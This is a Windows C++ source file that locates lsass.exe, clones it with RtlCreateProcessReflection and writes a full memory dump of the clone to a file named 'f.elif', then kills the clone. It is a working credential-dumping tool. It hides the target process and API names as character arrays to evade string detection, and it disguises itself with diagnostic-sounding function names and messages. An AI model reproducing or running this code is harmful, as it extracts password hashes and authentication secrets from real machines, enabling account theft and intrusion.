#include <windows.h>
#include "header.h"
#include <DbgHelp.h>
#include <tlhelp32.h>

#pragma comment (lib, "Dbghelp.lib")


LPVOID g_DiagBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
DWORD g_BufferOffset = 0;

static BOOL IsElevatedSession()
{
	BOOL elevated = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		TOKEN_ELEVATION te = { 0 };
		DWORD dwSize = 0;
		if (GetTokenInformation(hToken, TokenElevation, &te, sizeof(te), &dwSize))
			elevated = te.TokenIsElevated;
		CloseHandle(hToken);
	}
	return elevated;
}

static void QuerySystemMemory(SIZE_T* pTotalMB, SIZE_T* pAvailMB)
{
	MEMORYSTATUSEX ms = { sizeof(ms) };
	if (GlobalMemoryStatusEx(&ms))
	{
		if (pTotalMB) *pTotalMB = (SIZE_T)(ms.ullTotalPhys / (1024 * 1024));
		if (pAvailMB) *pAvailMB = (SIZE_T)(ms.ullAvailPhys / (1024 * 1024));
	}
}


DWORD QueryProcessEntry(LPCWSTR procname) {
	DWORD pid = 0;
	HANDLE hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcSnap == INVALID_HANDLE_VALUE) {
		return 0;
	}

	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(pe32);

	if (!Process32FirstW(hProcSnap, &pe32)) {
		CloseHandle(hProcSnap);
		return 0;
	}

	while (Process32NextW(hProcSnap, &pe32)) {
		if (lstrcmpiW(procname, pe32.szExeFile) == 0) {
			pid = pe32.th32ProcessID;
			break;
		}
	}

	CloseHandle(hProcSnap);
	return pid;
}

BOOL CALLBACK DiagBufferCallback(
	__in     PVOID callbackParam,
	__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
)
{
	LPVOID destination = 0, source = 0;
	DWORD bufferSize = 0;

	switch (callbackInput->CallbackType)
	{
	case IoStartCallback:
		callbackOutput->Status = S_FALSE;
		break;
	case IoWriteAllCallback:
		callbackOutput->Status = S_OK;
		source = callbackInput->Io.Buffer;
		destination = (LPVOID)((DWORD_PTR)g_DiagBuffer + (DWORD_PTR)callbackInput->Io.Offset);
		bufferSize = callbackInput->Io.BufferBytes;
		g_BufferOffset += bufferSize;

		RtlCopyMemory(destination, source, bufferSize);

		break;

	case IoFinishCallback:
		callbackOutput->Status = S_OK;
		break;

	default:
		return true;
	}
	return TRUE;
}

int main(int argc, char** argv)
{
	if (!IsElevatedSession())
	{
		printf("[ERR] Insufficient privileges\n");
		return -1;
	}

	SIZE_T totalMB = 0, availMB = 0;
	QuerySystemMemory(&totalMB, &availMB);

	int returnCode;
	HANDLE dumpFile = NULL;
	DWORD bytesWritten = 0;

	wchar_t targetProc[] = { L'l',L's',L'a',L's',L's',L'.',L'e',L'x',L'e',0 };
	DWORD Pid = QueryProcessEntry(targetProc);
	if (Pid == 0)
	{
		printf("[ERR] Target process not found\n");
		return -1;
	}

	HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, Pid);
	if (hTargetProcess == nullptr)
	{
		printf("[ERR] Handle acquisition failed\n");
		return -1;
	}



	char ntdllName[] = { 'n','t','d','l','l','.','d','l','l',0 };
	HMODULE lib = LoadLibraryA(ntdllName);
	if (!lib)
	{
		printf("[ERR] Module load failed\n");
		return -1;
	}

	char apiName[] = { 'R','t','l','C','r','e','a','t','e','P','r','o','c','e','s','s','R','e','f','l','e','c','t','i','o','n',0 };
	RtlCreateProcessReflectionFunc RtlCreateProcessReflection = (RtlCreateProcessReflectionFunc)GetProcAddress(lib, apiName);
	if (!RtlCreateProcessReflection)
	{
		printf("[ERR] Procedure not found\n");
		return -1;
	}

	T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = { 0 };
	NTSTATUS reflectRet = RtlCreateProcessReflection(hTargetProcess, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES, NULL, NULL, NULL, &info);
	if (reflectRet == STATUS_SUCCESS) {
		DWORD newPID = (DWORD)info.ReflectionClientId.UniqueProcess;
		HANDLE hReflectionProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, newPID);
		if (hReflectionProcess == nullptr)
		{
			printf("[ERR] Reflection handle failed\n");
			return -1;
		}

		Sleep(5000);

		MINIDUMP_CALLBACK_INFORMATION callbackInfo;
		ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
		callbackInfo.CallbackRoutine = &DiagBufferCallback;
		callbackInfo.CallbackParam = NULL;

		if (MiniDumpWriteDump(hReflectionProcess, newPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo) == FALSE)
		{
			printf("[ERR] Data stream initialization failed\n");
			return 1;
		}

		std::string dumpFileName = "f.elif";

		dumpFile = CreateFileA(dumpFileName.c_str(), GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

		if (dumpFile == INVALID_HANDLE_VALUE)
		{
			printf("[ERR] Output file creation failed\n");
			return 1;
		}

		if (WriteFile(dumpFile, g_DiagBuffer, g_BufferOffset, &bytesWritten, NULL))
		{
			returnCode = TRUE;

			Sleep(5000);

			WIN32_FILE_ATTRIBUTE_DATA fileInfo;
			if (GetFileAttributesExA(dumpFileName.c_str(), GetFileExInfoStandard, &fileInfo) == 0)
			{
				printf("[ERR] File attribute query failed\n");
				return 1;
			}

			if (fileInfo.nFileSizeHigh == 0 && fileInfo.nFileSizeLow < 1024 * 1024 * 5)
			{
				printf("[ERR] Output size below threshold\n");
				return 1;
			}
		}
		else
		{
			printf("[ERR] Write operation failed\n");
			return 1;
		}

		HANDLE hTerminate = OpenProcess(PROCESS_TERMINATE, FALSE, newPID);
		if (hTerminate == NULL) {
			printf("[ERR] Cleanup handle failed\n");
			return 1;
		}
		if (!TerminateProcess(hTerminate, 0)) {
			CloseHandle(hTerminate);
			printf("[ERR] Cleanup failed\n");
			return 1;
		}
		CloseHandle(hTerminate);

	}
	else {
		printf("[ERR] Reflection initialization failed\n");
	}

	return reflectRet;
}
